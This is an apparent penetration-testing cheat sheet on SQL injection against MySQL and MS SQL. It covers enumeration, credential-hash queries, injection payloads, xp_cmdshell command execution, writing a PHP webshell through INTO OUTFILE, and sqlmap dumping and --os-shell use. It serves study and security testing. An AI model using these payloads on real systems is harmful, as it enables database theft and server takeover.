# SQL Injection

[OWASP SQL Injection Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)

## Enumerate MySQL

* Use built-in on Kali `mysql`
* -u username
* -p 'password'
* -h host addr
* -P port

```bash
mysql -u root -p'root' -h 192.168.50.16 -P 3306
```

```sql
-- MySQL
select system_user();
select version(); -- MySQL accepts both version() and @@version.
show databases;
show tables from mysql;
select * from mysql.user where User = 'username' limit 1;
select user, authentication_string from mysql.user where user = 'username';
...
| username | $A$005$?qvorPp8#lTKH1j54xuw4C5VsXe5IAa1cFUYdQMiBxQVEzZG9XWd/e6
```

## Enumerate MS SQL

* Use built-in on Windows `sqlcmd`
* Use built-in on Kali `impacket-mssqlclient`
* Default DBs "master, tempdb, model, and msdb"

```bash
# kali connect to MS SQL
impacket-mssqlclient Administrator:Password@Database-IP -windows-auth
```

```mssql
-- MS SQL
SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM dbname.information_schema.tables;
SELECT TOP 1 * FROM master.dbo.sysusers; -- LIMIT 1
```

## Manual SQL Injection

Error-based SQLi

* Use `'` to close the string
* Use `' OR 1=1` to ignore the first parameter
* Use `' OR 1=1 -- //` comment and slashes truncate
* Use `' OR 1=1 IN (select version()) -- //` as short hand in where clause

```plain
' or 1=1 in (select user()) -- //
' or 1=1 in (select version()) -- //
' or 1=1 in (select * from users) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

UNION-based SQLi

* Use `UNION SELECT ...` to concatinate to queries
* Preconditions:
* UNION query has same number of columns as the original query.
  * Use `' ORDER BY 1 -- //` identify the number of columns
* UNION query data types are compatible between each column.
  * Use `null` to test for nullable types

```plain
-- MySQL Syntax
' UNION SELECT null, user(), database(), version() -- //
' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database() -- //
' UNION SELECT null, username, password, description, null FROM users -- //
```

Bolean- and Time-based attacks

* Use AND which always is TRUE
* Use IF to delay the response
* *Should* be automated with `sqlmap`

```plain
' AND 1=1 -- //
' AND IF (1=1, sleep(3),'false') -- //
```

## Exploit MS SQL Injections

Exploit MS SQL Databases with `xp_cmdshell`

```sql
-- Enable shell command execution withxp_commshell
> impacket-mssqlclient Administrator:Password@Database-IP -windows-auth
EXECUTE sp_configure 'show advanced options', 1;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE; -- apply changes
```

```sql
-- Execute whoami command and read the output row
EXECUTE xp_cmdshell 'whoami';
nt service\mssql$sqlexpress
```

## Exploit My SQL Injections

* Exploit My SQL Databases with `select into file`

The [SELECT ... INTO OUTFILE](https://dev.mysql.com/doc/refman/8.0/en/select-into.html) writes the selected rows to a file. Column and line terminators can be specified to produce a specific output format.

```sql
-- Write a PHP webshell to disc
UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

```sql
-- direct value to file output
SELECT * FROM (VALUES ROW(1,2,3),ROW(4,5,6),ROW(7,8,9)) AS t
    INTO OUTFILE '/tmp/select-values.txt';

-- selected column table output
SELECT a,b,a+b INTO OUTFILE '/tmp/result.txt'
  FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '"'
  LINES TERMINATED BY '\n'
  FROM test_table;

-- table output
TABLE employees ORDER BY lname LIMIT 1000
    INTO OUTFILE '/tmp/employee_data_1.txt'
    FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '"', ESCAPED BY '\'
    LINES TERMINATED BY '\n';
```

## Automate SQL Injection Attacks

* Automate SQL Injection with `sqlmap`
* -u URL
* -p parameter to scan
* --time-sec 1
* --tables enumerate tables
* --dump DBMS database table entries
* --dump-all DBMS databases table entries
* -r load a file with a HTTP request e.g. BURP
* --os-shell provides us with a full interactive shell
* --web-root defines where to upload the webshell e.g. "/var/www/html/tmp"
* --flush-session reset seesion data

```bash
sudo sqlmap --update
sqlmap -hh
# time based blind SQLi, pe patient
sqlmap -u http://target.com/db.php?user=1 -p user
sqlmap -u http://target.com/db.php?user=1 -p user --time-sec 1 --users
sqlmap -u http://target.com/db.php?user=1 -p user --time-sec 1 --tables 
# dump table 'users' in database 'offsec'
sqlmap -u http://target.com/db.php?user=1 -p user --flush-session --time-sec 1 --dump -T users -D offsec
# install a webshell for [1] ASP[2] ASPX [3] JSP [4] PHP
sqlmap -r post-request.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
```
